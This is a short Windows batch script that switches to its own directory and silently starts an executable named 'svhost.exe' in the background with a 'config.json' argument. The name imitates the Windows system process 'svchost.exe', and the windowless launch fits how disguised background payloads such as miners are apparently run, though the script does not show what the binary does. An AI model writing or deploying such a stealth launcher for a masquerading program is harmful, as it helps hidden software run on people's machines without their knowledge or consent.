@echo off
:: Switch to the folder where this batch file is located
cd /d "%~dp0"

:: Start svhost.exe quietly in the background without creating a taskbar window (/b flag)
start /b "" "svhost.exe" -c "config.json"